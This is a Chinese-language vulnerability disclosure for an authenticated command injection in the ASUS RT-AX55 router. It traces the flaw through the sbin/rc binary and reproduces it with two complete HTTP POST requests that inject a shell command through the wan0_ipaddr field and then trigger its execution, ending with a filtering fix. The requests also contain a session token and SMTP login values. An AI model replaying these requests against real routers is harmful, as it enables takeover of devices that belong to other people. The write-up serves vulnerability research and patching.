# 0x01  漏洞描述 #

asus `RT-AX55` 路由器存在身份验证后的命令注入漏洞。

# 0x02  固件分析 #

固件下载：https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX55/FW_RT_AX55_300438651598.zip?model=RT-AX55
直接binwalk用-Me提取即可。

# 0x03  代码分析 #

分析`sbin/rc`二进制文件，在函数`FUN_0004d76c`中，从http请求参数`action_script`获取`ipsec_force_gen_cert`值，进而进入函数`FUN_000c937c`。

![](./img//1.png)

在函数`FUN_000c937c`中，将nvram中的`wan0_ipaddr`值赋给`local_220`，再将其写入`/jffs/ca_files/generate.sh`脚本，最后调用system函数执行`/jffs/ca_files/generate.sh`。

![](./img//2.png)

# 0x04  漏洞复现 #

设置`wan0_ipaddr`的值(wan0_ipaddr的值不能超过15个字符)。

request1:

    POST /start_apply.htm HTTP/1.1
    Host: 192.168.50.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 541
    Origin: http://192.168.50.1
    Connection: close
    Referer: http://192.168.50.1/Advanced_VPN_PPTP.asp
    Cookie: clickedItem_tab=0; asus_token=jvnu22Uwa5pxjFVrHWwM3adGIbhXoLE; clock_type=1; bw_rtab=INTERNET; ASUS_TrafficMonitor_unit=1
    Upgrade-Insecure-Requests: 1
    
    productid=RT-AX55&current_page=AiProtection_HomeProtection.asp&next_page=&modified=0&action_wait=4&action_mode=apply&action_script=restart_wrs%3Brestart_firewall%3Bemail_conf%3Bsend_confirm_mail&firmver=3.0.0.4&wrs_mals_enable=1&wrs_cc_enable=1&wrs_vp_enable=1&TM_EULA=1&PM_SMTP_SERVER=smtp.qq.com&PM_SMTP_PORT=587&PM_MY_EMAIL=177%40qq.com&PM_SMTP_AUTH_USER=177&PM_SMTP_AUTH_PASS=Qwer123400&wrs_mail_bit=7&wrs_mals_t=1685353258&wrs_vp_t=1685353258&wrs_cc_t=1685353258&wrs_protect_enable=1&fc_disable=1&wan0_ipaddr=`ls>/tmp/888`
    
![](./img//3.png)

触发命令注入。

    POST /start_apply.htm HTTP/1.1
    Host: 192.168.50.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 525
    Origin: http://192.168.50.1
    Connection: close
    Referer: http://192.168.50.1/Advanced_VPN_PPTP.asp
    Cookie: clickedItem_tab=0; asus_token=jvnu22Uwa5pxjFVrHWwM3adGIbhXoLE; clock_type=1; bw_rtab=INTERNET; ASUS_TrafficMonitor_unit=1
    Upgrade-Insecure-Requests: 1
    
    productid=RT-AX55&current_page=AiProtection_HomeProtection.asp&next_page=&modified=0&action_wait=4&action_mode=apply&action_script=restart_wrs%3Brestart_firewall%3Bemail_conf%3Bsend_confirm_mail%3Bipsec_force_gen_cert&firmver=3.0.0.4&wrs_mals_enable=1&wrs_cc_enable=1&wrs_vp_enable=1&TM_EULA=1&PM_SMTP_SERVER=smtp.qq.com&PM_SMTP_PORT=587&PM_MY_EMAIL=1977%40qq.com&PM_SMTP_AUTH_USER=197&PM_SMTP_AUTH_PASS=Qwer123400&wrs_mail_bit=7&wrs_mals_t=1685353258&wrs_vp_t=1685353258&wrs_cc_t=1685353258&wrs_protect_enable=1

![](./img//4.png)

![](./img//5.png)

# 0x05  漏洞修复 #

过滤`wan0_ipaddr`的中  `反引号 ; | & $`  换行符以及双引号字符。